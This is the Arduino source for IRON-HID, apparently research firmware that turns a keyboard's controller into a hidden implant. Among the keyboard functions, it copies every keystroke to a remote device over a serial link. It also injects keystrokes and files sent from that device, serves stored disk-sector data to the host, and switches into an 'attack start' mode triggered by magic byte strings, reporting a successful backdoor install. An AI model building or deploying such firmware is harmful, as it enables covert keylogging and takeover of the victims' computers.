/*
      IRON-HID Keyboard Firmware for Atmega2560 in Arduino Mega2560
                    Copyright (C) 2016 Seunghun Han 
         at National Security Research Institute of South Korea
*/

/*
Copyright (c) 2016 Seunghun Han at NSR of South Kora

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/


#include <string.h>
#include <SoftwareSerial.h>
#include <avr/interrupt.h>
#include <avr/sleep.h>
#include <avr/pgmspace.h>
#include <avr/power.h>
#include <avr/wdt.h>

////////////////////////////////////////////////////////////////////
// Keyboard Product Setting
////////////////////////////////////////////////////////////////////
#define CHERRY_COMPACT           // Wired Type Keyboard
//#define MATIAS_TACTILE_PRO     // Built-in Hub Type Keyboard
//#define MATIAS_LAPTOP_PRO      // Wireless Type Keyboard

#include "Image.h"
#include "Keymap.h"

////////////////////////////////////////////////////////////////////
// Gobal Variable
////////////////////////////////////////////////////////////////////
// TX/RX Pin Number
//int iBlueToothTx = 10;
//int iBlueToothRx = 11;

// Software Serial
//SoftwareSerial Serial1(iBlueToothTx, iBlueToothRx);

// CMD Type Define
#define CMD_TYPE_UNKNOWN     0
#define CMD_TYPE_DEBUG      'D'
#define CMD_TYPE_READ       'R'
#define CMD_TYPE_FILE       'F'
#define CMD_TYPE_COMMAND    'C'
#define CMD_TYPE_KEY        'K'
#define CMD_TYPE_LED        'L'
#define CMD_TYPE_ATTACK     'A'

// Define Recv Mode
#define MODE_COUNT          4

#define MODE_CMD_RECV       0
#define MODE_KEY_RECV       1
#define MODE_DATA_RECV      2
#define MODE_ATTACK_START   3
#define MODE_UNKNOWN        4

// Define Buffer Index
#define BUFFER_INDEX_CMD    MODE_CMD_RECV
#define BUFFER_INDEX_KEY    MODE_KEY_RECV


// Define State
#define STATE_RECV_CMD      0
#define STATE_RECV_SECTOR   1
#define STATE_RECV_DATA     2

#define FILE_CHUNK_SIZE     64
#define BULK_CHUNK_SIZE     32

// PIN 20~21 for toggle switch

////////////////////////////////////////////////////////////////////
// Key Structure
////////////////////////////////////////////////////////////////////
#define MAX_KEYCODE        6

typedef struct usbReportStruct
{
  unsigned char cModifier;
  unsigned char cReserved;
  unsigned char vcKeyCode[MAX_KEYCODE];
} USBREPORT;

////////////////////////////////////////////////////////////////////
// Gobal Function
// PC(Host) <---> Arduino(atmaga16u2 <-> atmega328) <---> Android(Remote)
////////////////////////////////////////////////////////////////////
void ProcessHostCMD(void);
void SendSectorDataToHost(int iSectorNumber);
void SendFileDataToRemote(char* pcBuffer, int iSize);
void SendRemoteDataToHost(int iSize);
void SendBulkSyncData(char* pcBuffer, int iSize);
void SetLEDState(char cLED);
void ToggleLEDState(USBREPORT* pstUSBReport);
char CheckLEDKeyPressed(USBREPORT* pstUSBReport);
bool SaveKeyDataToHost();
void SendKeyToHost(bool bOnlySendRemoteKey);
bool SendRemoteKeyToHost();
void InitMagicStringFinder();
bool MatchMagicString(char cData);
int DumpBufferdDataForMagicString(char* pcBuffer);
void EnterSleep(void);
void EnterDeepSleep(void);
void CheckButtonAndReset(void);
bool ConvertFNKey(USBREPORT* pstUSBReport, unsigned char* pcConvertKey);

////////////////////////////////////////////////////////////////////
//  Global Variable
////////////////////////////////////////////////////////////////////
char g_vcRemoteBuffer[2][128];
int g_viRemoteBufferIndex[2] = { 0, 0 };

int g_iRecvMode = MODE_CMD_RECV;
int g_iMatchMode = MODE_UNKNOWN;
int g_iNextIndex = 0;

// Start value is not in ASCII range 
char g_vcModeMagicString[][16] = {
 { 0xB2, 0xF9, 0xF4, 0xF7, 0x43, 0xE6, 0xF9, 0x72, 0x4D, 0x9F, 0xC8, 0x25, 0x52, 0x29, 0xCA, 0x1A },  // CMD Recv Mode Magic
 { 0xEF, 0x12, 0x21, 0xFB, 0xC9, 0xDA, 0x5D, 0x56, 0x69, 0x4A, 0x60, 0x08, 0x89, 0x90, 0xD4, 0x11 },  // Key Recv Mode Magic
 { 0x5C, 0x7A, 0xCE, 0xBC, 0x80, 0x74, 0x5B, 0x37, 0x56, 0x63, 0x60, 0x16, 0x68, 0x97, 0x88, 0xC1 },  // Data Recv Mode Magic
 { 0xa9, 0x0b, 0x3c, 0x2c, 0xe3, 0xc5, 0x83, 0x44, 0x84, 0xad, 0xe3, 0x29, 0xf7, 0x0a, 0x3f, 0x91 },  // Attack Start Mode Magic
};

int g_iInputRowStart = 22;
int g_iInputRowCount = 8;
int g_iOutputColStart = 30;
int g_iOutputColCount = 18;

int g_iLEDPinStart = 50;
int g_cLEDState = 0;
int g_cPrevLEDKeyState = 0;

char g_cAttackStart = 0;
char g_cAttackResult = 0;

USBREPORT g_stReport;

// Prev Key State
unsigned char g_vcPrevKeyState[MAX_COL] = { 0x00 };

#define PIN_LED             13
#define PIN_BUTTON_OUTPUT   21      // Connect to ground
#define PIN_BUTTON_INPUT    20      // Pull up

////////////////////////////////////////////////////////////////////
//  Implementation
////////////////////////////////////////////////////////////////////
/**
 *  Setup hardware.
 */
void setup()
{
  char cTemp;
  int i;
  
  // Input row setup
  for (i = 0 ; i < g_iInputRowCount ; i++)
  {
#ifndef CHERRY_COMPACT
    pinMode(g_iInputRowStart + i, INPUT);
    digitalWrite(g_iInputRowStart + i, HIGH);
#else
    pinMode(g_iInputRowStart + i, OUTPUT);
    digitalWrite(g_iInputRowStart + i, LOW);
#endif
  }
  
  // Output col setup
  for (i = 0 ; i < g_iOutputColCount ; i++)
  {
#ifndef CHERRY_COMPACT
    pinMode(g_iOutputColStart + i, OUTPUT);
    digitalWrite(g_iOutputColStart + i, HIGH);
#else
    pinMode(g_iOutputColStart + i, INPUT);
    digitalWrite(g_iOutputColStart + i, HIGH);
#endif
  }

  // LED status
  for (i = 0 ; i < LED_COUNT ; i++)
  {
    pinMode(g_iLEDPinStart + i, OUTPUT);
    digitalWrite(g_iLEDPinStart + i, HIGH);
  }
  g_cLEDState = 0;
  g_cPrevLEDKeyState = 0;
  
  // Initialize key state
  memset(g_vcPrevKeyState, 0xFF, sizeof(g_vcPrevKeyState));
  memset(&g_stReport, 0, sizeof(g_stReport));

  // Initialize finder
  InitMagicStringFinder();

  // Atmega16U2 <--> Atmeta328  
  Serial.begin(115200);
  // Atmega328 <--> Remote
  Serial1.begin(115200);
 
#ifdef MATIAS_LAPTOP_PRO
  // Atmega328 <--> Host Bluetooth
  Serial2.begin(115200);
  
  // Input for button press check
  pinMode(PIN_BUTTON_INPUT, INPUT);
  digitalWrite(PIN_BUTTON_INPUT, HIGH);
  
  pinMode(PIN_BUTTON_OUTPUT, OUTPUT);
  digitalWrite(PIN_BUTTON_OUTPUT, LOW);  
#endif

  // Flush dummy input
  while(Serial.available())
  {
      cTemp = Serial.read();
  }
  
  while(Serial1.available())
  {
      cTemp = Serial1.read();
  }
  
  Serial1.print("\r\n=== Firmware starts ===\r\n");  
  
  pinMode(PIN_LED, OUTPUT);
}

/**
 *  Do periodic work.
 */ 
void loop()
{
  int iIndex;
  char cData;
  
  // Remote to Host(Bluetooth to Serial)
  iIndex = g_viRemoteBufferIndex[g_iRecvMode];
  if (iIndex < sizeof(g_vcRemoteBuffer[0]))
  {
    ProcessRemoteCMD();
  }

  // Host to Remote
  if (Serial.available())
  {
    ProcessHostCMD();
  }  
  
  // Save key state when changed
  // If bluetooth, immediately send key
  if (SaveKeyDataToHost() == true)
  {
#ifdef MATIAS_LAPTOP_PRO
    SendKeyToHost(false);
#endif
  }
  else
  {
#ifdef MATIAS_LAPTOP_PRO
    SendKeyToHost(true);
#endif
  }
  
  // Check button and reset connectoin
  CheckButtonAndReset();
  
  //EnterSleep();
}

/**
 *  Process remote command.
 */
void ProcessRemoteCMD(void)
{
  char cData;
  int iCopySize;
  int iIndex;
  
  while (Serial1.available())
  {
    cData = Serial1.read();

    // No magic string, then save data to buffer
    if (MatchMagicString(cData) == false)
    {
      iIndex = g_viRemoteBufferIndex[g_iRecvMode];
      
      iCopySize = DumpBufferdDataForMagicString(g_vcRemoteBuffer[g_iRecvMode] + iIndex);
      iIndex += iCopySize;
      g_vcRemoteBuffer[g_iRecvMode][iIndex] = cData;
      iIndex++;

      g_viRemoteBufferIndex[g_iRecvMode] = iIndex;
    }
  }
}

/**
 *  Process host command or atmega16U2 command.
 *    ex) D;;Hello;
 *    ex) R;0;;
 *    ex) K;;;
 *    ex) A;;0; and A;;1;
 */
void ProcessHostCMD(void)
{
  char cCMDType = CMD_TYPE_UNKNOWN;
  int iState = STATE_RECV_CMD;
  int iSectorNumber = 0;
  char* pcDataBuffer = NULL;
  char cData;
  char vcBuffer[512];
  char vcDbgBuffer[100];
  bool bAlreadySent;
  int i;
  
  while(1)
  {
    int iIndex = 0;
    
    // Read until seperator
    ReadUntilSeperator(vcBuffer, ';', 0);
    
    switch(iState)
    {
      case STATE_RECV_CMD:
        iState = STATE_RECV_SECTOR;
        cCMDType = vcBuffer[0];
        break;
        
      case STATE_RECV_SECTOR:
        iState = STATE_RECV_DATA;
        sscanf(vcBuffer, "%d", &iSectorNumber);
        break;
    }
    
    // 1 Complete~!!
    if (iState == STATE_RECV_DATA)
    {
      break;
    }
  }    

  //=============================================================================    
  // Process CMD
  //=============================================================================    
  switch(cCMDType)
  {
      // Host to Remote
    case CMD_TYPE_DEBUG:
      // Read until seperator
      ReadUntilSeperator(vcBuffer, ';', 0);
      Serial1.print("D;;");
      Serial1.print(vcBuffer);
      Serial1.print(";");
      break;
      
      // Arduino to Host
    case CMD_TYPE_READ:
      // Read until seperator
      ReadUntilSeperator(vcBuffer, ';', 0);
      // Send sector buffer
      SendSectorDataToHost(iSectorNumber);
      break;
      
      // Host to Remote
    case CMD_TYPE_FILE:
      // Read until file chunk size
      ReadUntilSeperator(vcBuffer, ';', FILE_CHUNK_SIZE);
      // Send sector buffer
      SendFileDataToRemote(vcBuffer, FILE_CHUNK_SIZE);
      break;
    
      // Arduino to Host
    case CMD_TYPE_COMMAND:
      // Read until seperator
      ReadUntilSeperator(vcBuffer, ';', 0);
      // Send CMD data to host
      SendRemoteDataToHost(BUFFER_INDEX_CMD, FILE_CHUNK_SIZE);
      break;
    
      // Atmega328 to Atmega16u2(-> Host)  
    case CMD_TYPE_KEY:
      // Read until seperator
      ReadUntilSeperator(vcBuffer, ';', 0);
      SendKeyToHost(false);
      break;

      // Atmega16U2 to Atmega328
    case CMD_TYPE_ATTACK:
      ReadUntilSeperator(vcBuffer, ';', 0);
      // Process get attack start flag or set attack result flag
      ProcessAttackFlags(vcBuffer);
      break;

      // Host to atmega328    
    case CMD_TYPE_LED:
      // Read until seperator
      ReadUntilSeperator(vcBuffer, ';', 0);
      // Turn on/off LED
      SetLEDState(vcBuffer[0]);
      break;
      
      // Unknown command    
    case CMD_TYPE_UNKNOWN:
      break;
  }

  Serial.flush();
  Serial1.flush();
#ifdef MATIAS_LAPTOP_PRO
  Serial2.flush();
#endif
}

/**
 *  Read until seperator. 
 *  If iReadSize is not zero, read until iReadSize + seperator(1byte) for fixed 
 *  size packet
 */
void ReadUntilSeperator(char* pcBuffer, char cSeperator, int iReadSize)
{
  int iIndex = 0;
  char cData;

  while(1)
  {
    if (!Serial.available())
    {
      continue;
    }
    cData = Serial.read();
    //Serial1.write(cData);
    
    if (iReadSize == 0)
    {
      if (cData == cSeperator)
      {
        pcBuffer[iIndex] = '\0';
        break;
      }
    }
    else
    {
      // Read 1 more byte
      if (iIndex == iReadSize)
      {
        pcBuffer[iIndex] = '\0';
      	break;
      }	
    }  
    
    pcBuffer[iIndex] = cData;
    iIndex++;
  }
}

/**
 *  Send sector data to host, 512 Bytes.
 */
void SendSectorDataToHost(int iSectorNumber)
{
  char vcBuffer[512];
  char *pcBuffer;
  int i;
  int j;
  char cData;
  int iLength;
  int iCount;
  int iSend = 0;

  if (iSectorNumber >= g_iSectorCount)
  {
      memset(vcBuffer, 0x00, 512);
      pcBuffer = vcBuffer;
      SendBulkSyncData(vcBuffer, 512);
      return ;
  }
  
  // Get Sector Buffer
  pcBuffer = (char*)pgm_read_word(&(g_vcSectors[iSectorNumber]));
  iLength = (int)pgm_read_word(&(g_viSectorLength[iSectorNumber]));
  sprintf(vcBuffer, "D;;%d;", iLength);
  Serial1.print(vcBuffer);
  
  if (iLength < 512)
  {
    Serial1.print("D;;Encoded;");
  }
  else
  {
    Serial1.print("D;;Normal;");
  }
  
  // Read from Flash~!!
  for (i = 0 ; i < iLength ; i++)
  {
    if (iLength < 512)
    {
      if (i % 2 == 0)
      {
        iCount = pgm_read_byte_near(pcBuffer + i);
      }
      else
      {
        cData = pgm_read_byte_near(pcBuffer + i); 
        for (j = 0 ; j < iCount ; j++)
        {
          vcBuffer[iSend] = cData;
          iSend++;
        }
      }
    }
    else
    {
      // Normal Write
      cData = pgm_read_byte_near(pcBuffer + i); 
      vcBuffer[iSend] = cData;
      iSend++;
    }
  }
  
  // Data Send
  SendBulkSyncData(vcBuffer, 512);
}

/**
 *  Send bulk data with sync signal.
 */
void SendBulkSyncData(char* pcBuffer, int iSize)
{
  char cData;
  int i;
  
  for (i = 0 ; i < iSize / BULK_CHUNK_SIZE ; i++)
  {
      while(!Serial.available())
      {
        ;
      }
      // Sync Recv
      cData = Serial.read();

      Serial.write((uint8_t*) pcBuffer + i * BULK_CHUNK_SIZE, BULK_CHUNK_SIZE);
  }
  Serial.flush();
  Serial1.print("D;;Send Bulk End;");
  Serial1.flush();
}

/**
 *  Send file chunk data to remote.
 */
void SendFileDataToRemote(char* pcBuffer, int iSize)
{
  Serial1.print("F;;");
  Serial1.write((const uint8_t*)pcBuffer, iSize);
  Serial1.print(";");
}

/**
 *  Send remote command to host.
 */
void SendRemoteDataToHost(int iRecvMode, int iSize)
{
  int i;
  int iLoopCnt;
  
  if (g_viRemoteBufferIndex[BUFFER_INDEX_CMD] < iSize)
  {
    iLoopCnt = g_viRemoteBufferIndex[BUFFER_INDEX_CMD];
  }
  else
  {
    iLoopCnt = iSize;
  }
  
  if (iLoopCnt > 0)
  {
    Serial.write((const uint8_t*) g_vcRemoteBuffer[BUFFER_INDEX_CMD], iLoopCnt);
    
    memcpy(g_vcRemoteBuffer[BUFFER_INDEX_CMD], g_vcRemoteBuffer[BUFFER_INDEX_CMD] + 
      iLoopCnt, g_viRemoteBufferIndex[BUFFER_INDEX_CMD] - iLoopCnt);   
    g_viRemoteBufferIndex[BUFFER_INDEX_CMD] -= iLoopCnt;
  }
  
  if (iLoopCnt != iSize)
  {
    iLoopCnt = iSize - iLoopCnt;
    for (i = 0 ; i < iLoopCnt ; i++)
    {
      Serial.write(0x00); 
    }
  }  
}

/**
 *  Send remote key data to host(Remote -> atmega16U2 or bluetooth HID).
 */
void SendKeyToHost(bool bOnlySendRemoteKey)
{
  bool bAlreadySent;
  
  bAlreadySent = false;
  
  // Check all key is released
  if (IsAllKeyIsReleased() == true)
  {
    // Then, send remote keys
    bAlreadySent = SendRemoteKeyToHost();
  }
  
  if (bOnlySendRemoteKey == true)
  {
    return ;
  }
  
  if (bAlreadySent == false)
  {
    // If Matias Laptop Pro, send key to bluetooth
#ifdef MATIAS_LAPTOP_PRO
    unsigned char vcHeaderNormal[3] = { 0xFD, 0x09, 0x01 };
    unsigned char vcHeaderCustom[3] = { 0xFD, 0x03, 0x03 };
    unsigned char vcConvertKey[2] = { 0x00, 0x00 };
    
    // FN + Other Key Combination
    ConvertFNKey(&g_stReport, vcConvertKey);
    Serial2.write(vcHeaderNormal, sizeof(vcHeaderNormal));
    Serial2.write((unsigned char*)&g_stReport, sizeof(g_stReport));    

    Serial2.write(vcHeaderCustom, sizeof(vcHeaderCustom));
    Serial2.write(vcConvertKey, sizeof(vcConvertKey));
#else
    // Send key data to host
    Serial.write((unsigned char*)&g_stReport, sizeof(g_stReport));
#endif

    ToggleLEDState(&g_stReport);    
  }
}

/**
 *  Set keyboard LED state.
 */
void SetLEDState(char cLED)
{
  int i;
  
  // Set LED
  for (i = 0 ; i < LED_COUNT ; i++)
  {
    if (cLED & (1 << i))
    {
      digitalWrite(g_iLEDPinStart + i, LOW);
    }
    else
    {
      digitalWrite(g_iLEDPinStart + i, HIGH);
    }
  }

  g_cLEDState = cLED;
}


/**
 *  Check LED key pressed.
 */
char CheckLEDKeyPressed(USBREPORT* pstUSBReport)
{
  char vcLEDKey[3] = { KEY_NUMLOCK, KEY_CAPSLOCK, KEY_SCROLLLOCK };
  char cCurLEDKeyState = 0;
  char cNewLEDState = 0;
  int i;
  int j;

  // Check LED key state
  for (i = 0 ; i < MAX_KEYCODE ; i++)
  {
    for (j = 0 ; j < sizeof(vcLEDKey) ; j++)
    {
      if (pstUSBReport->vcKeyCode[i] == vcLEDKey[j])
      {
        cCurLEDKeyState ^= (0x01 << j);
      }
    }
  }

  // Check key press now
  for (i = 0 ; i < sizeof(vcLEDKey) ; i++)
  {
    if (((g_cPrevLEDKeyState & (0x01 << i)) == 0) &&
        ((cCurLEDKeyState & (0x01 << i)) != 0))
    {
      cNewLEDState |= (0x01 << i);
    }
  }

  g_cPrevLEDKeyState = cCurLEDKeyState;

  return cNewLEDState;
}

/**
 *  Toggle LED State.
 */
void ToggleLEDState(USBREPORT* pstUSBReport)
{
  char cLEDKeyPressed;
  char cToggledLEDState = g_cLEDState;

  // Check LED key state
  cLEDKeyPressed = CheckLEDKeyPressed(pstUSBReport);

  // LED Key is pressed now, change LED state
  if (cLEDKeyPressed != 0)
  {
    cToggledLEDState ^= cLEDKeyPressed;
    SetLEDState(cToggledLEDState);  
  }
}

/**
 *  Save key pressed data to global variable.
 *
 *  New cherry compact keyboard has no diod, so we need different processing  
 */
bool SaveKeyDataToHost()
{
  unsigned char cKeyCode;
  USBREPORT stReport;
  int iIndex = 0;
  int iChanged = 0;
  char cData;
  char cInput;
  int i;
  int j;
  unsigned char g_vcCurKeyState[MAX_COL];
    
  memset(&stReport, 0x00, sizeof(stReport)); 
  
#ifndef CHERRY_COMPACT
  // Check key down & compare with previous state
  for (j = 0 ; j < MAX_COL ; j++)
  {
    // Column set low so check row
    digitalWrite(g_iOutputColStart + j, LOW);

    g_vcCurKeyState[j] = PINA;
    
    // Column set high
    digitalWrite(g_iOutputColStart + j, HIGH);

    if (g_vcCurKeyState[j] != g_vcPrevKeyState[j])
    {
      iChanged = 1;
    }
  }
#else  
  memset(g_vcCurKeyState, 0xFF, sizeof(g_vcCurKeyState));

  // Check key down
  for (j = 0 ; j < MAX_ROW ; j++)
  {
    digitalWrite(g_iInputRowStart + j, LOW);
        
    for (i = 0 ; i < MAX_COL ; i++)
    {
      // Key down
      if (digitalRead(g_iOutputColStart + i) == 0)
      {
        g_vcCurKeyState[i] ^= (0x01 << j);      
      }
    }
    digitalWrite(g_iInputRowStart + j, HIGH);
  }

  // Compare with previous state
  for (j = 0 ; j < MAX_COL ; j++)
  {
    if (g_vcCurKeyState[j] != g_vcPrevKeyState[j])
    {
      iChanged = 1;
    }
  }
#endif

  // Compare
  for (j = 0 ; (j < MAX_COL) && (iIndex < sizeof(stReport.vcKeyCode)) ; j++)
  {
    if (g_vcCurKeyState[j] == 0xFF)
    {
      continue;
    }
    
    for (i = 0 ; i < g_iInputRowCount ; i++)
    {
      cData = g_vcCurKeyState[j] & (0x01 << i);
      
      if (cData != 0)
      {
        continue; 
      }

      /*
      // Debug Message
      char vcBuffer[200];
      sprintf(vcBuffer, "Row[%d] Col[%d]\n", i, j);
      Serial.print(vcBuffer);      
      */
      
      cKeyCode = g_vcKeyMaxtrix[i][j];
      switch(cKeyCode)
      {
        case KEY_LCONTROL:
          stReport.cModifier |= MODIFIER_LCONTROL;
          break;
          
        case KEY_LSHIFT:
          stReport.cModifier |= MODIFIER_LSHIFT;
          break;

        case KEY_LALT:
          stReport.cModifier |= MODIFIER_LALT;
          break;

        case KEY_LGUI:
          stReport.cModifier |= MODIFIER_LGUI;
          break;

        case KEY_RCONTROL:
          stReport.cModifier |= MODIFIER_RCONTROL;
          break;

        case KEY_RSHIFT:
          stReport.cModifier |= MODIFIER_RSHIFT;
          break;

        case KEY_RALT:
          stReport.cModifier |= MODIFIER_RALT;
          break;

        case KEY_RGUI:
          stReport.cModifier |= MODIFIER_RGUI;
          break;

        default:
          stReport.vcKeyCode[iIndex] = cKeyCode;
          iIndex++;
          break;
      }
      
      // Report define total 8 byte(1 Modifier, 1 Reserved, 6 Key Code)
      if (iIndex >= sizeof(stReport.vcKeyCode))
      {
        break;
      }  
    }
  }
  
  // Send to atmega16u2
  if (iChanged > 0)
  {
    //Serial.write((unsigned char*)&stReport, sizeof(stReport));
    memcpy(&g_stReport, &stReport, sizeof(g_stReport));
    memcpy(g_vcPrevKeyState, g_vcCurKeyState, sizeof(g_vcPrevKeyState));
    
    // Send key data to remote
    Serial1.print("M;;");
    Serial1.write((unsigned char*)&g_stReport, sizeof(g_stReport));
    Serial1.print(";");
    
    return true;
  }
  
  return false;
}

/**
 *  Send remote key data to host.
 */
bool SendRemoteKeyToHost()
{
  int i;
  int iLength;
  int iLoopCnt;
  int iSendKeyByte;
  
  iLoopCnt = g_viRemoteBufferIndex[BUFFER_INDEX_KEY];
  if (iLoopCnt == 0)  
  {
    return false;
  }
  
  // Find terminator
  for (i = 0 ; i < iLoopCnt ; i++)
  {
    if (g_vcRemoteBuffer[BUFFER_INDEX_KEY][i] == (char)0xFF)
    {
      break;
    }
  }
  
  // Not found 
  if (i == iLoopCnt)
  {
    return false;
  }
  
  iLength = i;
  
  // 1 Modifier + 1 Reserved + 6 Keys
  if (iLength > 7)
  {
    iSendKeyByte = 6;
  }
  else
  {
    iSendKeyByte = iLength - 1;
  }
  
#ifdef MATIAS_LAPTOP_PRO
  unsigned char vcHeaderNormal[3] = { 0xFD, 0x09, 0x01 };
  
  Serial2.write(vcHeaderNormal, 3);
  Serial2.write((const uint8_t*) g_vcRemoteBuffer[BUFFER_INDEX_KEY], 1);
  Serial2.write(0x00);
  Serial2.write((const uint8_t*) g_vcRemoteBuffer[BUFFER_INDEX_KEY] + 1, iSendKeyByte);
#else
  Serial.write((const uint8_t*) g_vcRemoteBuffer[BUFFER_INDEX_KEY], 1);
  Serial.write(0x00);
  Serial.write((const uint8_t*) g_vcRemoteBuffer[BUFFER_INDEX_KEY] + 1, iSendKeyByte);
#endif

  if (iLength != 7)
  {
    iLoopCnt = 7 - iLength;
    for (i = 0 ; i < iLoopCnt ; i++)
    {
#ifdef MATIAS_LAPTOP_PRO
      Serial2.write(0x00);
#else
      Serial.write(0x00);
#endif
    }
  }  
  
  memcpy(g_vcRemoteBuffer[BUFFER_INDEX_KEY], g_vcRemoteBuffer[BUFFER_INDEX_KEY] + 
    iLength + 1, g_viRemoteBufferIndex[BUFFER_INDEX_KEY] - iLength - 1);   
  g_viRemoteBufferIndex[BUFFER_INDEX_KEY] -= (iLength + 1);
  
  return true;
}

/**
 *  Check all key is released.
 */
bool IsAllKeyIsReleased()
{
  int i;

  if (g_stReport.cModifier != 0)
  {
    return false;
  }

  for (i = 0 ; i < sizeof(g_stReport.vcKeyCode) ; i++)
  {
    if (g_stReport.vcKeyCode[i] != 0)
    {
      return false;
    }
  }

  return true;
}

/**
 *  Process get attack flag or set attack result.
 */
void ProcessAttackFlags(char* pcBuffer)
{
  int iValue;

  sscanf(pcBuffer, "%d", &iValue);

  // Get Attack Flag
  if (iValue == 0)
  {
    // Send attack start flag and clear
    Serial.write(g_cAttackStart);
    g_cAttackStart = 0;
  }
  // Set Attack Result
  else
  {
    g_cAttackResult = (char) iValue;
    Serial1.print("D;;The backdoor is installed successfuly\n;");
  }
}

////////////////////////////////////////////////////////////////////
//  The Magic String Finder Code
////////////////////////////////////////////////////////////////////
/**
 *  Initialize the magic string finder.
 */
void InitMagicStringFinder()
{
  g_iMatchMode = MODE_UNKNOWN;
  g_iNextIndex = 0;
}

/**
 *  Match the magic string.
 */
bool MatchMagicString(char cData)
{
  int i;
  bool bRet = false;

  // Not yet
  if (g_iMatchMode == MODE_UNKNOWN)
  {
    for (i = 0 ; i < MODE_COUNT ; i++)
    {
      if (g_vcModeMagicString[i][0] == cData)
      {
        g_iMatchMode = i;
        break;
      }
    }

    // Found!!
    if (g_iMatchMode != MODE_UNKNOWN)
    {
      g_iNextIndex++;
      bRet = true;
    }
    return bRet;
  }
  else
  {
    // Not matched
    if (g_vcModeMagicString[g_iMatchMode][g_iNextIndex] != cData)
    {
      return bRet;
    }
    g_iNextIndex++;
    bRet = true;

    // Match the full magic string and change receive mode 
    if (g_iNextIndex >= sizeof(g_vcModeMagicString[0]))
    {
      switch(g_iMatchMode)
      {
        case MODE_CMD_RECV:
          g_iRecvMode = g_iMatchMode;      
          Serial1.print("D;;Change to cmd receive mode\n;"); 
          break;
          
        case MODE_KEY_RECV:
          g_iRecvMode = g_iMatchMode;      
          Serial1.print("D;;Change to key receive mode\n;"); 
          break;
          
        case MODE_DATA_RECV:
          g_iRecvMode = g_iMatchMode;      
          Serial1.print("D;;Change to data receive mode\n;"); 
          break;
          
        case MODE_ATTACK_START:
          g_cAttackStart = 1;
          Serial1.print("D;;Set attack mode\n;"); 
          break;
      } 
      
      // Initialize state
      InitMagicStringFinder();
    }

    return bRet;
  }
}

/**
 *  Dump saved magic string to buffer.
 */
int DumpBufferdDataForMagicString(char* pcBuffer)
{
  int iCopySize = 0;

  // Not yet matched
  if ((g_iMatchMode == MODE_UNKNOWN) || (g_iNextIndex == 0))
  {
    return iCopySize;
  }

  memcpy(pcBuffer, g_vcModeMagicString[g_iMatchMode], g_iNextIndex);
  iCopySize = g_iNextIndex;
  
  // Initialize
  InitMagicStringFinder();
  return iCopySize;
}

/**
 *  Setup timer.
 */
void SetupTimer()
{
  // Normal timer operation
  TCCR1A = 0x00; 
  
  //Clear the timer counter register
  TCNT1 = 0xFF00; 
  
  /* Configure the prescaler(No prescailer), total 0.5ms
   * 0x00 : Stop timer
   * 0x01 : 1:1  -> 0.51ms
   * 0x02 : 1:8  -> 4.09ms
   * 0x03 : 1:64 -> 32.7ms
   * 0x04 : 1:256
   * 0x05 : 1:1024
   */
  TCCR1B = 0x01;
  
  // Enable the timer overlow interrupt
  TIMSK1 = 0x01;
}

/**
 *  ISR of timer1 overflow.
 */
ISR(TIMER1_OVF_vect)
{
  //Serial.println("Timer Overrun!!!");
}

/**
 *  Sleep.
 */
void EnterSleep(void)
{
  set_sleep_mode(SLEEP_MODE_IDLE);
  
  sleep_enable();

  /* 
   * Disable all of the unused peripherals. This will reduce power
   * consumption further and, more importantly, some of these
   * peripherals may generate interrupts that will wake our Arduino from
   * sleep!
   */
  power_timer1_enable();
  SetupTimer();

  /* Now enter sleep mode. */
  sleep_mode();
  
  /* The program will continue from here after the timer timeout*/
  sleep_disable(); /* First thing to do is disable sleep. */
  power_timer1_disable();
  
  /* Re-enable the peripherals. */
  //power_all_enable();
}

/**
 *  ISR of WDT overflow.
 */
ISR(WDT_vect)
{
  //Serial.println("WDT Overrun!!!");
}

/**
 *  Deep sleep.
 */
void EnterDeepSleep(void)
{
  wdt_enable(WDTO_2S);
  // Enable Watchdog Interrupt
  WDTCSR |= _BV(WDIE);

  set_sleep_mode(SLEEP_MODE_PWR_DOWN);
  sleep_enable();
  
  // Now enter sleep mode
  sleep_mode();
  
  // The program will continue from here after the WDT timeout
  sleep_disable(); // First thing to do is disable sleep
  
  wdt_disable();
  
  // Re-enable the peripherals.
  //power_all_enable();
}

/**
 *  Check button and reset connection.
 */
void CheckButtonAndReset(void)
{
  char cData;
  
  // Check button pressed
  cData = digitalRead(PIN_BUTTON_INPUT);

  if (cData == 0)
  {
    // Delay for a while
    delay(2000);

    Serial2.write(0x00);    
  }
}

#ifdef MATIAS_LAPTOP_PRO
/**
 *  If FN key is pressed, change key code to layer 2 key.
 */
bool ConvertFNKey(USBREPORT* pstUSBReport, unsigned char* pcConvertKey)
{
  int i;
  int j;
  bool bExistFNKey = false;
  
  // Check FN key pressed
  for (i = 0 ; i < sizeof(pstUSBReport->vcKeyCode) ; i++)
  {
    if (pstUSBReport->vcKeyCode[i] == KEY_FN)
    {
      bExistFNKey = true;
      pstUSBReport->vcKeyCode[i] = 0x00;
    }      
  }
  
  if (bExistFNKey == false)
  {
    return false;
  }

  // Find Other Key and Change it
  // Check FN Key
  for (i = 0 ; i < sizeof(pstUSBReport->vcKeyCode) ; i++)
  {
    for (j = 0 ; j < sizeof(g_vcLayer1Key) ; j++)
    {
      if (pstUSBReport->vcKeyCode[i] == g_vcLayer1Key[j])
      {
        // No multimedia key, only replace
        if (j > MULTIMEDIA_KEY_INDEX)
        {
          pstUSBReport->vcKeyCode[i] = (unsigned char) g_vcLayer2Key[j];
        }
        else
        {
          pstUSBReport->vcKeyCode[i] = 0x00;
          *(short*)pcConvertKey = g_vcLayer2Key[j];
          break;
        }
      }
    }
  }
  
  return bExistFNKey;
}     
#endif
